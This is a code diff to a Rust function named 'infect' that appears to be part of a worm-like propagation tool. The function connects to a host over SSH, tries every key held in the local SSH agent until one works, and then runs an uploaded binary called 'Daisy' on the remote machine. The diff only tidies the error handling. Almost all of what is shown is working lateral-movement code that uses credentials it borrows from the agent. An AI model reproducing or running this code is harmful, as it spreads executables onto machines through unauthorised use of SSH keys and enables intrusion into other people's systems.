@@ -44,17 +44,17 @@ pub fn infect(host: &HostSpec) -> Result<ChainLink, Error> {
     // Establish TCP connection
     log::trace!("Connecting to {}", &host.host_addr);
     let conn =
-        std::net::TcpStream::connect(&host.host_addr).map_err(|e| Error::ConnectionFailed(e))?;
+        std::net::TcpStream::connect(&host.host_addr).map_err(Error::ConnectionFailed)?;
 
     // Create SSH session.
-    let mut session = ssh2::Session::new().map_err(|e| Error::SSHPreauthError(e))?;
+    let mut session = ssh2::Session::new().map_err(Error::SSHPreauthError)?;
     session.set_compress(true);
     session.set_blocking(true);
 
     // Perform SSH handshake
     log::trace!("Beginning SSH handshake");
     session.set_tcp_stream(conn);
-    session.handshake().map_err(|e| Error::SSHPreauthError(e))?;
+    session.handshake().map_err(Error::SSHPreauthError)?;
     log::trace!("SSH handshake complete");
 
     // Perform authentication
@@ -71,7 +71,7 @@ pub fn infect(host: &HostSpec) -> Result<ChainLink, Error> {
         .expect("Failed to get a list of keys from the SSH agent");
     let mut authenticated: bool = false;
     for key in keys {
-        if let Ok(_) = agent.userauth(&host.username, &key) {
+        if agent.userauth(&host.username, &key).is_ok() {
             authenticated = true;
             break;
         }
@@ -98,10 +98,10 @@ pub fn infect(host: &HostSpec) -> Result<ChainLink, Error> {
     // Execute uploaded binary
     let mut channel = session
         .channel_session()
-        .map_err(|e| Error::ExecuteDaisy(e))?;
+        .map_err(Error::ExecuteDaisy)?;
     channel
-        .exec(&format!("{}", remote_exe_path))
-        .map_err(|e| Error::ExecuteDaisy(e))?;
+        .exec(&remote_exe_path)
+        .map_err(Error::ExecuteDaisy)?;
     log::trace!("Executed Daisy on remote host");
 
     // DEBUG: Read command output. This is just to verify that the command was executed.
